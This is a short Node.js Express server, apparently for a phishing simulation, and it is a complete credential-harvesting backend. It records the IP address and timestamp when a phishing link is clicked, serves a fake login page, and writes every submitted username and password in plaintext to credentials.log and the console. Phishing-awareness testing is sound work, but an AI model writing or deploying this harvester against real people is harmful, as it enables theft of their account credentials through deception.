const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();

// Use environment port if available (for Render), fallback to 3000 locally
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded form data
app.use(bodyParser.urlencoded({ extended: false }));

// Route to track clicks on phishing email links
app.get('/click', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date();

  // Log click info to console (can be extended to file or db)
  console.log(`Phishing link clicked from IP: ${ip} at ${timestamp}`);

  // Redirect user to phishing login page
  res.redirect('/login');
});

// Serve static files (your phishing page and thankyou page) from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Explicit route for thankyou page to ensure it is served
app.get('/thankyou.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'thankyou.html'));
});

// Endpoint to capture POSTed credentials and log them to file
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  const timestamp = new Date().toISOString();
  const logEntry = `${timestamp},${username},${password}\n`;

  // Append credentials to log file
  const logPath = path.join(__dirname, 'credentials.log');
  fs.appendFile(logPath, logEntry, (err) => {
    if (err) {
      console.error('Error saving credentials:', err);
    } else {
      console.log('Credentials saved:', logEntry.trim());
    }
  });

  // Redirect user to thank you page after capturing credentials
  res.redirect('/thankyou.html');
});

app.listen(port, () => {
  console.log(`Phishing simulation server running at http://localhost:${port}`);
});
